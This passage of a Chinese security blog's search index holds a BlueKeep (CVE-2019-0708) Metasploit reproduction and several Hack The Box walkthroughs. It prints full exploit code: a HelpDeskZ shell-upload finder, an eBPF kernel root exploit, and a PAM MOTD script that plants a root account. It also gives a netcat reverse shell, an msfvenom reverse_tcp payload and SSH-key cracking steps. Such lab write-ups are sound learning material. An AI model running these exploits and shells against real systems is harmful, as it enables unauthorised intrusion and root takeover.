","date":"2019-09-07","objectID":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:0","tags":["RDP","漏洞复现"],"title":"CVE-2019-0708远程桌面代码执行漏洞复现","uri":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"漏洞利用 进入 msfconsole 进入以后使用 reload_all 重新加载 0708RDP 利用模块 使用 use exploit/windows/rdp/cve_2019_0708_bluekeep_rce 启用 0708RDP 攻击模块 使用 show options 查看需要配置的选项： ","date":"2019-09-07","objectID":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:3:0","tags":["RDP","漏洞复现"],"title":"CVE-2019-0708远程桌面代码执行漏洞复现","uri":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"使用默认的 shell 填写配置信息，并执行攻击： ","date":"2019-09-07","objectID":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:3:1","tags":["RDP","漏洞复现"],"title":"CVE-2019-0708远程桌面代码执行漏洞复现","uri":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["漏洞复现"],"content":"使用 meterpreter 的 shell 注意： 请在两次攻击之间重启目标机，否则会出现攻击失败的现象！ ","date":"2019-09-07","objectID":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:3:2","tags":["RDP","漏洞复现"],"title":"CVE-2019-0708远程桌面代码执行漏洞复现","uri":"/2019/09/cve-2019-0708%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["靶场"],"content":"Hack The Box靶场练习记录","date":"2019-09-06","objectID":"/2019/09/hacktheboxblocky/","tags":["HTB靶场"],"title":"Hack The Box —— Blocky","uri":"/2019/09/hacktheboxblocky/"},{"categories":["靶场"],"content":"Hack The Box —— Blocky ","date":"2019-09-06","objectID":"/2019/09/hacktheboxblocky/:0:0","tags":["HTB靶场"],"title":"Hack The Box —— Blocky","uri":"/2019/09/hacktheboxblocky/"},{"categories":["靶场"],"content":"信息搜集 ","date":"2019-09-06","objectID":"/2019/09/hacktheboxblocky/:1:0","tags":["HTB靶场"],"title":"Hack The Box —— Blocky","uri":"/2019/09/hacktheboxblocky/"},{"categories":["靶场"],"content":"nmap nmap -T4 -A -v 10.10.10.37 Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-06 10:37 CST PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5a 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA) | 256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA) |_ 256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: WordPress 4.8 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: BlockyCraft \u0026#8211; Under Construction! 8192/tcp closed sophos Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 开放了21、22、80 端口。 尝试搜索 ProFTPD 1.3.5a 版本的漏洞，发现未授权文件复制漏洞，利用 msf 测试，无法利用。 访问 80 端口，是一个简单的 WordPress 站点， 利用 wpscan 工具进行扫描： wpscan --enumerate t --enumerate p --enumerate u --url=http://10.10.10.37/ 得到以下信息： 用户名 notch 主题 twentyseventeen 插件 akismet - v3.3.2 未发现相关漏洞。 ","date":"2019-09-06","objectID":"/2019/09/hacktheboxblocky/:1:1","tags":["HTB靶场"],"title":"Hack The Box —— Blocky","uri":"/2019/09/hacktheboxblocky/"},{"categories":["靶场"],"content":"目录爆破 使用 dirbuster 工具，得到以下结果： 发现了一个 plugins 目录，由于正常的 wp 插件目录存放在 wp-content/plugins 下，访问 该目录，得到两个 jar 包： 将 jar 包下载到本地，反编译，得到数据库的用户名的密码： 尝试使用该密码登录 phpmyadmin，发现成功登录： ","date":"2019-09-06","objectID":"/2019/09/hacktheboxblocky/:1:2","tags":["HTB靶场"],"title":"Hack The Box —— Blocky","uri":"/2019/09/hacktheboxblocky/"},{"categories":["靶场"],"content":"漏洞利用 在现有的基础上，尝试使用 sql语句 读文件，首先查看可读目录的范围： showGLOBALVARIABLESlike\"%secure_file_priv\" 但是目录被限制，转而其它思路。 想到密码可能重复利用，遂利用 notch 账户和 mysql 的密码登录 ssh。 发现可以登录。 查看 user.txt 获得第一个 flag。 尝试权限提升，但是试了好多方法都不行，突然想到再次用相同的密码切到 root 用户，发现成功切到 root。 查看 root.txt，得到第二个 flag。 ","date":"2019-09-06","objectID":"/2019/09/hacktheboxblocky/:2:0","tags":["HTB靶场"],"title":"Hack The Box —— Blocky","uri":"/2019/09/hacktheboxblocky/"},{"categories":["靶场"],"content":"Hack The Box靶场练习记录","date":"2019-09-06","objectID":"/2019/09/hacktheboxhelp/","tags":["HTB靶场"],"title":"Hack The Box —— Help","uri":"/2019/09/hacktheboxhelp/"},{"categories":["靶场"],"content":"Hack The Box —— Help ","date":"2019-09-06","objectID":"/2019/09/hacktheboxhelp/:0:0","tags":["HTB靶场"],"title":"Hack The Box —— Help","uri":"/2019/09/hacktheboxhelp/"},{"categories":["靶场"],"content":"信息搜集 ","date":"2019-09-06","objectID":"/2019/09/hacktheboxhelp/:1:0","tags":["HTB靶场"],"title":"Hack The Box —— Help","uri":"/2019/09/hacktheboxhelp/"},{"categories":["靶场"],"content":"nmap nmap -T4 -A -v 10.10.10.121 发现 22、80、3000 端口开放，访问 80 端口，是一个 apache 默认页面。 ","date":"2019-09-06","objectID":"/2019/09/hacktheboxhelp/:1:1","tags":["HTB靶场"],"title":"Hack The Box —— Help","uri":"/2019/09/hacktheboxhelp/"},{"categories":["靶场"],"content":"目录爆破 利用 dirbuster 爆破目录： 发现 support 目录，访问得到： 搜索 helpdeskz 相关漏洞，发现一处任意文件上传漏洞：https://www.exploit-db.com/exploits/40300 import hashlib import time import sys import requests print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit' if len(sys.argv) \u003c 3: print \"Usage: {}[baseUrl] [nameOfUploadedFile]\".format(sys.argv[0]) sys.exit(1) helpdeskzBaseUrl = sys.argv[1] fileName = sys.argv[2] currentTime = int(time.time()) for x in range(0, 300): plaintext = fileName + str(currentTime - x) md5hash = hashlib.md5(plaintext).hexdigest() url = helpdeskzBaseUrl+md5hash+'.php' response = requests.head(url) if response.status_code == 200: print \"found!\" print url sys.exit(0) print \"Sorry, I did not find anything\" ","date":"2019-09-06","objectID":"/2019/09/hacktheboxhelp/:2:0","tags":["HTB靶场"],"title":"Hack The Box —— Help","uri":"/2019/09/hacktheboxhelp/"},{"categories":["靶场"],"content":"漏洞利用 首先，在 submit a ticket 处上传一个反弹 shell 的脚本文件： 返回： 然后，执行 exp 脚本： python2 poc.py http://10.10.10.121/support/uploads/tickets/ 1.php 但是此处无论如何都不能访问到 shell，后来经过查询相关资料得知：由于服务器所在地区的时区与国内的时区不一样导致 current - x 得到的数不正确，因此，将脚本稍作改动： import hashlib import time, calendar import sys import requests print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit' if len(sys.argv) \u003c 3: print \"Usage: {}[baseUrl] [nameOfUploadedFile]\".format(sys.argv[0]) sys.exit(1) helpdeskzBaseUrl = sys.argv[1] fileName = sys.argv[2] # currentTime = int(time.time()) response = requests.head(helpdeskzBaseUrl) serverTime = response.headers[\"Date\"] print serverTime timeFormat = \"%a, %d%b %Y %H:%M:%S %Z\" currentTime = int(calendar.timegm(time.strptime(serverTime, timeFormat))) print currentTime for x in range(0, 90): plaintext = fileName + str(currentTime - x) md5hash = hashlib.md5(plaintext).hexdigest() url = helpdeskzBaseUrl+md5hash+'.php' response = requests.head(url) if response.status_code == 200: print \"found!\" print url sys.exit(0) print \"Sorry, I did not find anything\" 成功反弹 shell： 查看 user.txt 获取第一个 flag whoami 查看权限，发现时普通用户权限 uname -a查看内核版本号，尝试内核提权。 ","date":"2019-09-06","objectID":"/2019/09/hacktheboxhelp/:3:0","tags":["HTB靶场"],"title":"Hack The Box —— Help","uri":"/2019/09/hacktheboxhelp/"},{"categories":["靶场"],"content":"提权 搜索相关内核版本漏洞信息，发现https://www.exploit-db.com/exploits/44298 /* * Ubuntu 16.04.4 kernel priv esc * * all credits to @bleidl * - vnik */ // Tested on: // 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 // if different kernel adjust CRED offset + check kernel stack size #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cunistd.h\u003e#include \u003cerrno.h\u003e#include \u003cfcntl.h\u003e#include \u003cstring.h\u003e#include \u003clinux/bpf.h\u003e#include \u003clinux/unistd.h\u003e#include \u003csys/mman.h\u003e#include \u003csys/types.h\u003e#include \u003csys/socket.h\u003e#include \u003csys/un.h\u003e#include \u003csys/stat.h\u003e#include \u003cstdint.h\u003e #define PHYS_OFFSET 0xffff880000000000 #define CRED_OFFSET 0x5f8 #define UID_OFFSET 4 #define LOG_BUF_SIZE 65536 #define PROGSIZE 328 int sockets[2]; int mapfd, progfd; char *__prog = \"\\xb4\\x09\\x00\\x00\\xff\\xff\\xff\\xff\" \"\\x55\\x09\\x02\\x00\\xff\\xff\\xff\\xff\" \"\\xb7\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x18\\x19\\x00\\x00\\x03\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\xbf\\x91\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff\" \"\\x62\\x0a\\xfc\\xff\\x00\\x00\\x00\\x00\" \"\\x85\\x00\\x00\\x00\\x01\\x00\\x00\\x00\" \"\\x55\\x00\\x01\\x00\\x00\\x00\\x00\\x00\" \"\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x79\\x06\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\xbf\\x91\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff\" \"\\x62\\x0a\\xfc\\xff\\x01\\x00\\x00\\x00\" \"\\x85\\x00\\x00\\x00\\x01\\x00\\x00\\x00\" \"\\x55\\x00\\x01\\x00\\x00\\x00\\x00\\x00\" \"\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x79\\x07\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\xbf\\x91\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff\" \"\\x62\\x0a\\xfc\\xff\\x02\\x00\\x00\\x00\" \"\\x85\\x00\\x00\\x00\\x01\\x00\\x00\\x00\" \"\\x55\\x00\\x01\\x00\\x00\\x00\\x00\\x00\" \"\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x79\\x08\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\xbf\\x02\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\xb7\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x55\\x06\\x03\\x00\\x00\\x00\\x00\\x00\" \"\\x79\\x73\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x7b\\x32\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x55\\x06\\x02\\x00\\x01\\x00\\x00\\x00\" \"\\x7b\\xa2\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x7b\\x87\\x00\\x00\\x00\\x00\\x00\\x00\" \"\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"; char bpf_log_buf[LOG_BUF_SIZE]; static int bpf_prog_load(enum bpf_prog_type prog_type, const struct bpf_insn *insns, int prog_len, const char *license, int kern_version) { union bpf_attr attr = { .prog_type = prog_type, .insns = (__u64)insns, .insn_cnt = prog_len / sizeof(struct bpf_insn), .license = (__u64)license, .log_buf = (__u64)bpf_log_buf, .log_size = LOG_BUF_SIZE, .log_level = 1, }; attr.kern_version = kern_version; bpf_log_buf[0] = 0; return syscall(__NR_bpf, BPF_PROG_LOAD, \u0026attr, sizeof(attr)); } static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size, int max_entries) { union bpf_attr attr = { .map_type = map_type, .key_size = key_size, .value_size = value_size, .max_entries = max_entries }; return syscall(__NR_bpf, BPF_MAP_CREATE, \u0026attr, sizeof(attr)); } static int bpf_update_elem(uint64_t key, uint64_t value) { union bpf_attr attr = { .map_fd = mapfd, .key = (__u64)\u0026key, .value = (__u64)\u0026value, .flags = 0, }; return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, \u0026attr, sizeof(attr)); } static int bpf_lookup_elem(void *key, void *value) { union bpf_attr attr = { .map_fd = mapfd, .key = (__u64)key, .value = (__u64)value, }; return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, \u0026attr, sizeof(attr)); } static void __exit(char *err) { fprintf(stderr, \"error: %s\\n\", err); exit(-1); } static void prep(void) { mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3); if (mapfd \u003c 0) __exit(strerror(errno)); progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, (struct bpf_insn *)__prog, PROGSIZE, \"GPL\", 0); if (progfd \u003c 0) __exit(strerror(errno)); if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)) __exit(strerror(errno)); if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, \u0026progfd, sizeof(progfd)) \u003c 0) __exit(strerror(errno)); } static void wri","date":"2019-09-06","objectID":"/2019/09/hacktheboxhelp/:4:0","tags":["HTB靶场"],"title":"Hack The Box —— Help","uri":"/2019/09/hacktheboxhelp/"},{"categories":["靶场"],"content":"Hack The Box靶场练习记录","date":"2019-09-05","objectID":"/2019/09/hacktheboxtenten/","tags":["HTB靶场"],"title":"Hack The Box —— Tenten","uri":"/2019/09/hacktheboxtenten/"},{"categories":["靶场"],"content":"Hack The Box —— Tenten ","date":"2019-09-05","objectID":"/2019/09/hacktheboxtenten/:0:0","tags":["HTB靶场"],"title":"Hack The Box —— Tenten","uri":"/2019/09/hacktheboxtenten/"},{"categories":["靶场"],"content":"信息搜集 ","date":"2019-09-05","objectID":"/2019/09/hacktheboxtenten/:1:0","tags":["HTB靶场"],"title":"Hack The Box —— Tenten","uri":"/2019/09/hacktheboxtenten/"},{"categories":["靶场"],"content":"nmap nmap -T4 -A -v 10.10.10.6 发现服务器开了 22 端口和 80 端口浏览器访问 http 服务，发现 wordpress 站点。 ","date":"2019-09-05","objectID":"/2019/09/hacktheboxtenten/:1:1","tags":["HTB靶场"],"title":"Hack The Box —— Tenten","uri":"/2019/09/hacktheboxtenten/"},{"categories":["靶场"],"content":"漏洞扫描 利用 wpscan 工具扫描一波 wordpress 站的信息： wpscan --enumerate t --enumerate p --enumerate u --url=http://10.10.10.10/ 发现用户名： 插件漏洞： ","date":"2019-09-05","objectID":"/2019/09/hacktheboxtenten/:1:2","tags":["HTB靶场"],"title":"Hack The Box —— Tenten","uri":"/2019/09/hacktheboxtenten/"},{"categories":["靶场"],"content":"漏洞利用 搜索 Job-Manager 相关漏洞，发现，用户可以利用该插件可以上传 CV。由于 wordpress 上传的文件存放在 upload/year/month/filename 下，因此可以爆破出上传的 CV 文件，从而造成信息泄漏。 首先访问 Jobs Listing： 在 apply now 下获取 job 详细信息： 更改 url 中的 number 值，可以得到其它的 JOB APPLICATION， 使用如下命令，枚举 job title： 发现 HackerAccessGranted title，尝试使用 exp 进行用户上传 cv 的枚举： import requests print \"\"\" CVE-2015-6668 Title: CV filename disclosure on Job-Manager WP Plugin Author: Evangelos Mourikis Blog: https://vagmour.eu Plugin URL: http://www.wp-jobmanager.com Versions: \u003c=0.7.25 \"\"\" website = raw_input('Enter a vulnerable website: ') filename = raw_input('Enter a file name: ') filename2 = filename.replace(\" \", \"-\") for year in range(2016,2019): for i in range(1,13): for extension in {'php','html','pdf','png','gif','jpg','jpeg'}: URL = website + \"/wp-content/uploads/\" + str(year) + \"/\" + \"{:02}\".format(i) + \"/\" + filename2 + \".\" + extension print URL req = requests.get(URL) if req.status_code==200: print \"[+] URL of CV found! \" + URL 发现如下敏感文件： 访问，得到一张图片。 猜测图片隐写，使用 steghide extract -sf HackerAccessGranted.jpg，得到 id_rsa 文件。 打开 id_rsa 文件，发现该文件被加密： 使用 ssh2john 脚本文件将加密的内容转化为 john 可以破解的文件 python2 ssh2john id_rsa \u003e ssh_login 得到： 使用 john 进行密码破解： john ssh_login --wordlist=rockyou.txt 得到 id_rsa 的密码：superpassword。 尝试登录服务器： ssh -i id_rsa takis@10.10.10.10 得到第一个 flag。 尝试进入 root 目录，发现权限不足。 使用 sudo -l 命令，查看无需密码课执行的命令： 发现 /bin/fuckin 文件，查看文件内容： 执行：sudo /bin/fuckin /bin/bash，即可获得 root 权限： ","date":"2019-09-05","objectID":"/2019/09/hacktheboxtenten/:2:0","tags":["HTB靶场"],"title":"Hack The Box —— Tenten","uri":"/2019/09/hacktheboxtenten/"},{"categories":["靶场"],"content":"Hack The Box靶场练习记录","date":"2019-09-04","objectID":"/2019/09/hacktheboxpopcorn/","tags":["HTB靶场"],"title":"Hack The Box —— Popcorn","uri":"/2019/09/hacktheboxpopcorn/"},{"categories":["靶场"],"content":"Hack The Box —— Popcorn ","date":"2019-09-04","objectID":"/2019/09/hacktheboxpopcorn/:0:0","tags":["HTB靶场"],"title":"Hack The Box —— Popcorn","uri":"/2019/09/hacktheboxpopcorn/"},{"categories":["靶场"],"content":"信息搜集 ","date":"2019-09-04","objectID":"/2019/09/hacktheboxpopcorn/:1:0","tags":["HTB靶场"],"title":"Hack The Box —— Popcorn","uri":"/2019/09/hacktheboxpopcorn/"},{"categories":["靶场"],"content":"nmap nmap -T4 -A -v 10.10.10.6 发现服务器开了 22 端口和 80 端口浏览器访问 http 服务，发现 只有 apache 的默认页面。 ","date":"2019-09-04","objectID":"/2019/09/hacktheboxpopcorn/:1:1","tags":["HTB靶场"],"title":"Hack The Box —— Popcorn","uri":"/2019/09/hacktheboxpopcorn/"},{"categories":["靶场"],"content":"目录扫描 利用 dirsearch 工具扫描一波目录： python3 dirsearch -u http://10.10.10.6 -e html 发现 test.php 页面和 torrent 目录，针对 torrent 目录进行目录扫描，发现 upload 上传目录可以访问，同时存在 index.php 页面。 ","date":"2019-09-04","objectID":"/2019/09/hacktheboxpopcorn/:1:2","tags":["HTB靶场"],"title":"Hack The Box —— Popcorn","uri":"/2019/09/hacktheboxpopcorn/"},{"categories":["靶场"],"content":"功能点搜索 该网站为 bt 种子论坛站，注册用户，发现上传页面。 ","date":"2019-09-04","objectID":"/2019/09/hacktheboxpopcorn/:1:3","tags":["HTB靶场"],"title":"Hack The Box —— Popcorn","uri":"/2019/09/hacktheboxpopcorn/"},{"categories":["靶场"],"content":"漏洞利用 在上传点尝试上传 webshell，发现失败，猜测程序检测上传的文件是否为标准的 bt 种子文件，且并未绕过过滤。 继续上传正常的 bt 种子文件，进行进一步测试: 发现在上传好的种子页面存在 screenshots 图标上传点， 尝试上传 webshell，发现成功上传。 访问 upload 目录，得到 webshell 的地址： 菜刀连接： 成功获取 user 的 flag。 同时在 home 目录下发现 .cache 文件夹，进入后发现 motd.legal-displayed 文件。 利用搜索引擎搜索相关文档，发现： https://www.exploit-db.com/exploits/14339 利用虚拟终端反弹一个 shell 到本地，便于提权操作。 本机： nc -l 4444 受害机：nc -e /bin/bash 10.10.14.10 4444 利用菜刀上传 exp 脚本: #!/bin/bash # # Exploit Title: Ubuntu PAM MOTD local root # Date: July 9, 2010 # Author: Anonymous # Software Link: http://packages.ubuntu.com/ # Version: pam-1.1.0 # Tested on: Ubuntu 9.10 (Karmic Koala), Ubuntu 10.04 LTS (Lucid Lynx) # CVE: CVE-2010-0832 # Patch Instructions: sudo aptitude -y update; sudo aptitude -y install libpam~n~i # References: http://www.exploit-db.com/exploits/14273/ by Kristian Erik Hermansen P='toor❌0:0:root:/root:/bin/bash' S='toor:$6$tPuRrLW7$m0BvNoYS9FEF9/Lzv6PQospujOKt0giv.7JNGrCbWC1XdhmlbnTWLKyzHz.VZwCcEcYQU5q2DLX.cI7NQtsNz1:14798:0:99999:7:::' echo \"[*] Ubuntu PAM MOTD local root\" [ -z \"$(which ssh)\" ] \u0026\u0026 echo \"[-] ssh is a requirement\" \u0026\u0026 exit 1 [ -z \"$(which ssh-keygen)\" ] \u0026\u0026 echo \"[-] ssh-keygen is a requirement\" \u0026\u0026 exit 1 [ -z \"$(ps -u root |grep sshd)\" ] \u0026\u0026 echo \"[-] a running sshd is a requirement\" \u0026\u0026 exit 1 backup() { [ -e \"$1\" ] \u0026\u0026 [ -e \"$1\".bak ] \u0026\u0026 rm -rf \"$1\".bak [ -e \"$1\" ] || return 0 mv \"$1\"{,.bak} || return 1 echo \"[*] Backuped $1\" } restore() { [ -e \"$1\" ] \u0026\u0026 rm -rf \"$1\" [ -e \"$1\".bak ] || return 0 mv \"$1\"{.bak,} || return 1 echo \"[*] Restored $1\" } key_create() { backup ~/.ssh/authorized_keys ssh-keygen -q -t rsa -N '' -C 'pam' -f \"$KEY\" || return 1 [ ! -d ~/.ssh ] \u0026\u0026 { mkdir ~/.ssh || return 1; } mv \"$KEY.pub\" ~/.ssh/authorized_keys || return 1 echo \"[*] SSH key set up\" } key_remove() { rm -f \"$KEY\" restore ~/.ssh/authorized_keys echo \"[*] SSH key removed\" } own() { [ -e ~/.cache ] \u0026\u0026 rm -rf ~/.cache ln -s \"$1\" ~/.cache || return 1 echo \"[*] spawn ssh\" ssh -o 'NoHostAuthenticationForLocalhost yes' -i \"$KEY\" localhost true [ -w \"$1\" ] || { echo \"[-] Own $1failed\"; restore ~/.cache; bye; } echo \"[+] owned: $1\" } bye() { key_remove exit 1 } KEY=\"$(mktemp -u)\" key_create || { echo \"[-] Failed to setup SSH key\"; exit 1; } backup ~/.cache || { echo \"[-] Failed to backup ~/.cache\"; bye; } own /etc/passwd \u0026\u0026 echo \"$P\" \u003e\u003e /etc/passwd own /etc/shadow \u0026\u0026 echo \"$S\" \u003e\u003e /etc/shadow restore ~/.cache || { echo \"[-] Failed to restore ~/.cache\"; bye; } key_remove echo \"[+] Success! Use password toor to get root\" su -c \"sed -i '/toor:/d' /etc/{passwd,shadow}; chown root: /etc/{passwd,shadow}; \\ chgrp shadow /etc/shadow; nscd -i passwd \u003e/dev/null 2\u003e\u00261; bash\" toor 并给该脚本赋予执行权限： chmod + x 1.sh 执行脚本，获得 root 权限： ","date":"2019-09-04","objectID":"/2019/09/hacktheboxpopcorn/:2:0","tags":["HTB靶场"],"title":"Hack The Box —— Popcorn","uri":"/2019/09/hacktheboxpopcorn/"},{"categories":["靶场"],"content":"Hack The Box靶场练习记录","date":"2019-08-14","objectID":"/2019/08/hacktheboxdevel/","tags":["HTB靶场"],"title":"Hack The Box —— Devel","uri":"/2019/08/hacktheboxdevel/"},{"categories":["靶场"],"content":"Hack The Box —— Devel ","date":"2019-08-14","objectID":"/2019/08/hacktheboxdevel/:0:0","tags":["HTB靶场"],"title":"Hack The Box —— Devel","uri":"/2019/08/hacktheboxdevel/"},{"categories":["靶场"],"content":"信息搜集 ","date":"2019-08-14","objectID":"/2019/08/hacktheboxdevel/:1:0","tags":["HTB靶场"],"title":"Hack The Box —— Devel","uri":"/2019/08/hacktheboxdevel/"},{"categories":["靶场"],"content":"nmap nmap -T4 -A -v 10.10.10.5 发现服务器开了 21 端口和 80 端口，同时 ftp 服务可以匿名访问，但是不知道版本号。浏览器访问 http 服务，发现 只有 iis 的默认页面。 ","date":"2019-08-14","objectID":"/2019/08/hacktheboxdevel/:1:1","tags":["HTB靶场"],"title":"Hack The Box —— Devel","uri":"/2019/08/hacktheboxdevel/"},{"categories":["靶场"],"content":"目录扫描 利用 dirsearch 工具扫描一波目录： python3 dirsearch -u http://10.10.10.5 -e html 并未有什么特殊的发现。 ","date":"2019-08-14","objectID":"/2019/08/hacktheboxdevel/:1:2","tags":["HTB靶场"],"title":"Hack The Box —— Devel","uri":"/2019/08/hacktheboxdevel/"},{"categories":["靶场"],"content":"FTP 匿名访问 FTP 服务，发现当前目录下有写权限，所以，想通过上传 webshell 的方式获取服务器的权限。 ","date":"2019-08-14","objectID":"/2019/08/hacktheboxdevel/:1:3","tags":["HTB靶场"],"title":"Hack The Box —— Devel","uri":"/2019/08/hacktheboxdevel/"},{"categories":["靶场"],"content":"漏洞利用 ","date":"2019-08-14","objectID":"/2019/08/hacktheboxdevel/:2:0","tags":["HTB靶场"],"title":"Hack The Box —— Devel","uri":"/2019/08/hacktheboxdevel/"},{"categories":["靶场"],"content":"webshell 首先上传 aspx 的 webshell： 浏览器访问，发现 webshell 未报错，可以执行。 用蚁剑链接: 访问一些目录，发现权限不足。 利用蚁剑的虚拟终端，执行 whoami ，发现只有 iis user 的权限，遂想办法提权。 ","date":"2019-08-14","objectID":"/2019/08/hacktheboxdevel/:2:1","tags":["HTB靶场"],"title":"Hack The Box —— Devel","uri":"/2019/08/hacktheboxdevel/"},{"categories":["靶场"],"content":"权限提升 利用 msfvenom 生成 exe 木马文件，使用 msf 接收到回连的 shell，方便提权。 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f exe \u003e shell.exe 然后将生成的 shell.exe 文件通过蚁剑上传到目标服务器上，并通过虚拟终端执行。 使用 msf 监听端口，接收回连的 shell : 使用 msf 自带的检测脚本，查看可能用于提权的漏洞： 经过一个一个的测试：发现 ms10-015可以用来提权。 成功创建了一个新的 session. 在 meterpreter 下执行 getuid 命令： 发现成功提权。 接下来就可以 type c:\\users\\Administrator\\Desktop\\root.txt.txt 获取 flag 了。 ","date":"2019-08-14","objectID":"/2019/08/hacktheboxdevel/:2:2","tags":["HTB靶场"],"title":"Hack The Box —— Devel","uri":"/2019/08/hacktheboxdevel/"},{"categories":["靶场"],"content":"Hack The Box靶场练习记录","date":"2019-08-13","objectID":"/2019/08/hacktheboxoptimum/","tags":["HTB靶场"],"title":"Hack The Box —— Optimum","uri":"/2019/08/hacktheboxoptimum/"},{"categories":["靶场"],"content":"Hack The Box —— Lame ","date":"2019-08-13","objectID":"/2019/08/hacktheboxoptimum/:0:0","tags":["HTB靶场"],"title":"Hack The Box —— Optimum","uri":"/2019/08/hacktheboxoptimum/"},{"categories":["靶场"],"content":"信息搜集 ","date":"2019-08-13","objectID":"/2019/08/hacktheboxoptimum/:1:0","tags":["HTB靶场"],"title":"Hack The Box —— Optimum","uri":"/2019/08/hacktheboxoptimum/"},{"categories":["靶场"],"content":"nmap nmap -T4 -A -v 10.10.10.8 发现服务器只开了 80 端口，对应 hfs 服务，浏览器访问，发现 hfs 服务的版本号。 ","date":"2019-08-13","objectID":"/2019/08/hacktheboxoptimum/:1:1","tags":["HTB靶场"],"title":"Hack The Box —— Optimum","uri":"/2019/08/hacktheboxoptimum/"},{"categories":["靶场"],"content":"exploit-db 搜索相关漏洞，发现在 msf 上有对应的 exp ","date":"2019-08-13","objectID":"/2019/08/hacktheboxoptimum/:1:2","tags":["HTB靶场"],"title":"Hack The Box —— Optimum","uri":"/2019/08/hacktheboxoptimum/"},{"categories":["靶场"],"content":"漏洞利用 msf 下使用 use exploit/windows/http/rejetto_hfs_exec，并配置 meterpreter payload。 exploit 运行，成功反弹 meterpreter shell sysinfo 上显示该系统是 64 位的，但是我们默认用的 meterpreter payload 是 32 位的，所以将 meterpreter 转移到 64 位的进程上，如 explorer.exe 直接查看当前目录，发现 user.txt ，type 一下 查看内容，提交即可。 此时，发现是非管理员权限，在 